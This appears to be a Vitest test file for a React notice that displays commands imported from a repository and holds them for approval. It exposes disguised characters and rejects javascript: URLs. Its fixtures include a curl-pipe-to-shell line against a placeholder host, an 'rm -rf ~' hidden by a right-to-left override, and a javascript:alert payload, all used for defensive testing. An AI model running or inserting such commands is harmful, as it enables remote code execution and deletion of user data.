import React, { act } from "react"
import { createRoot, type Root } from "react-dom/client"
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest"

const mocks = vi.hoisted(() => ({
  get: vi.fn(),
  accept: vi.fn(),
  discard: vi.fn(),
  error: vi.fn(),
  success: vi.fn(),
  dispatch: vi.fn(),
}))

vi.mock("@/lib/i18n", () => ({
  useI18n: () => ({ t: (key: string, vars?: Record<string, string>) => (vars ? `${key} ${JSON.stringify(vars)}` : key) }),
}))
vi.mock("@/components/ui", () => ({ toast: { error: mocks.error, success: mocks.success } }))
vi.mock("@/lib/projectScopedEvents", () => ({ dispatchProjectScopedEvent: mocks.dispatch }))
vi.mock("@/lib/openchamberConfig", () => ({
  getImportedRepositoryCommands: mocks.get,
  acceptImportedRepositoryCommands: mocks.accept,
  discardImportedRepositoryCommands: mocks.discard,
}))

const { ImportedRepositoryCommandsNotice } = await import("./ImportedRepositoryCommandsNotice")

const PROJECT = { id: "proj", path: "/repo" }
const HELD = {
  setupCommands: ["curl -fsSL https://example.invalid/x | sh"],
  actions: [
    {
      id: "dev",
      name: "Start dev server",
      command: "pnpm dev --host 0.0.0.0",
      openUrl: "http://localhost:3000",
      autoOpenUrl: true,
    },
  ],
  primaryActionId: "dev",
}

describe("commands held from a repository's legacy project file", () => {
  let container: HTMLDivElement
  let root: Root
  let onAdded: ReturnType<typeof vi.fn<(project: { id: string; path: string }) => void>>

  const render = async () => {
    await act(async () => {
      root.render(<ImportedRepositoryCommandsNotice projectRef={PROJECT} onAdded={onAdded} />)
    })
  }

  const button = (label: string) => {
    const found = [...container.querySelectorAll("button")].find((entry) => entry.textContent === label)
    if (!found) throw new Error(`no button ${label}`)
    return found
  }

  beforeEach(() => {
    ;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
    container = document.createElement("div")
    document.body.appendChild(container)
    root = createRoot(container)
    onAdded = vi.fn<(project: { id: string; path: string }) => void>()
    mocks.get.mockResolvedValue(HELD)
    mocks.accept.mockResolvedValue("done")
    mocks.discard.mockResolvedValue("done")
  })

  afterEach(() => {
    act(() => root.unmount())
    container.remove()
    vi.clearAllMocks()
  })

  test("shows every command in full before anything can be added", async () => {
    // The header Play button shows only a name the repository chose; this is where the person sees what would run.
    await render()

    const text = container.textContent ?? ""
    expect(text).toContain("curl -fsSL https://example.invalid/x | sh")
    expect(text).toContain("Start dev server")
    expect(text).toContain("pnpm dev --host 0.0.0.0")
    expect(text).toContain('settings.projects.imported.opensUrl {"url":"http://localhost:3000/"}')
    expect(mocks.accept).not.toHaveBeenCalled()
  })

  test("renders nothing when no commands are held", async () => {
    mocks.get.mockResolvedValue(null)
    await render()

    expect(container.textContent).toBe("")
  })

  test("adding saves the held commands, tells the header and reloads the sections", async () => {
    await render()

    await act(async () => button("settings.projects.imported.actions.add").click())

    // The snapshot on screen is what is approved.
    expect(mocks.accept).toHaveBeenCalledWith(PROJECT, HELD)
    expect(mocks.discard).not.toHaveBeenCalled()
    expect(mocks.dispatch).toHaveBeenCalledWith(expect.any(String), "proj")
    expect(onAdded).toHaveBeenCalledWith(PROJECT)
    expect(container.textContent).toBe("")
  })

  test("discarding adds nothing and leaves the editors below alone", async () => {
    await render()

    await act(async () => button("settings.projects.imported.actions.discard").click())

    expect(mocks.discard).toHaveBeenCalledWith(PROJECT, HELD)
    expect(mocks.accept).not.toHaveBeenCalled()
    expect(mocks.dispatch).not.toHaveBeenCalled()
    // Reloading the editors would drop unsaved edits there, and no live setting changed.
    expect(onAdded).not.toHaveBeenCalled()
    expect(container.textContent).toBe("")
  })

  test("a stored snapshot that changed is shown again instead of being added", async () => {
    const replaced = { setupCommands: ["make bootstrap"], actions: [], primaryActionId: null }
    mocks.accept.mockResolvedValue("changed")
    await render()
    mocks.get.mockResolvedValue(replaced)

    await act(async () => button("settings.projects.imported.actions.add").click())

    expect(mocks.error).toHaveBeenCalledWith("settings.projects.imported.toast.changed")
    expect(onAdded).not.toHaveBeenCalled()
    expect(container.textContent).toContain("make bootstrap")
    expect(container.textContent).not.toContain("curl -fsSL")
  })

  test("invisible and reordering characters in a command are written out", async () => {
    // A right-to-left override can make "rm -rf ~" read as something harmless; U+034F and U+3164 render as nothing.
    mocks.get.mockResolvedValue({
      setupCommands: ["echo safe\u202E~ fr- mr\u200B\u034F\u3164"],
      actions: [],
      primaryActionId: null,
    })
    await render()

    expect(container.textContent).toContain("echo safe⟨U+202E⟩~ fr- mr⟨U+200B⟩⟨U+034F⟩⟨U+3164⟩")
    expect(container.querySelector("code")?.getAttribute("dir")).toBe("ltr")
  })

  test("an action shows the command the launcher types, not the stored text", async () => {
    mocks.get.mockResolvedValue({
      setupCommands: [],
      actions: [{ id: "a", name: "Dev", command: "  pnpm dev\r\n--port 3000\u0007  " }],
      primaryActionId: null,
    })
    await render()

    expect(container.querySelector("code")?.textContent).toBe("pnpm dev\n--port 3000")
  })

  test.each([
    [{ openUrl: "http://localhost:4000" }, null],
    [{ openUrl: "localhost:4000", autoOpenUrl: true }, 'settings.projects.imported.opensUrl {"url":"http://localhost:4000/"}'],
    [
      { openUrl: "http://localhost:4000", autoOpenUrl: true, waitForUrl: true },
      'settings.projects.imported.opensUrlWhenReady {"url":"http://localhost:4000/"}',
    ],
    [{ autoOpenUrl: true }, "settings.projects.imported.opensOutputUrl"],
    [{ openUrl: "javascript:alert(1)", autoOpenUrl: true }, 'settings.projects.imported.invalidUrl {"url":"javascript:alert(1)"}'],
  ])("describes the URL the way the launcher opens it (%o)", async (flags, expected) => {
    mocks.get.mockResolvedValue({
      setupCommands: [],
      actions: [{ id: "a", name: "Docs", command: "pnpm docs", ...flags }],
      primaryActionId: null,
    })
    await render()

    const text = container.textContent ?? ""
    if (expected) expect(text).toContain(expected)
    else expect(text).not.toMatch(/settings\.projects\.imported\.(opens|invalid)/)
  })

  test("a failed save keeps the commands on screen and says so", async () => {
    mocks.accept.mockResolvedValue("failed")
    await render()

    await act(async () => button("settings.projects.imported.actions.add").click())

    expect(mocks.error).toHaveBeenCalledWith("settings.projects.imported.toast.failed")
    expect(onAdded).not.toHaveBeenCalled()
    expect(container.textContent).toContain("curl -fsSL https://example.invalid/x | sh")
  })
})
